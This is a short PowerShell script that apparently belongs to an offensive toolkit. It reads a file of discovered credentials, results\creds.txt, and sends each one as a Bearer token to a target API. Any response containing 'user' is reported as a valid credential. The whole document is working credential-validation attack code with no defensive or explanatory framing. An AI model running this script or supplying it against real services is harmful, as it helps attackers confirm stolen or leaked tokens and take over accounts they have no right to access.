Write-Host "[*] Attempting to validate discovered credentials..." -ForegroundColor Cyan
$lines = Get-Content results\\creds.txt

foreach ($line in $lines) {
    try {
        $res = Invoke-WebRequest -Uri "https://api.target.com" -Headers @{ Authorization = "Bearer $line" } -UseBasicParsing
        if ($res.Content -like "*user*") {
            Write-Host "[+] VALID CREDENTIAL:" $line -ForegroundColor Green
        }
    } catch {}
}
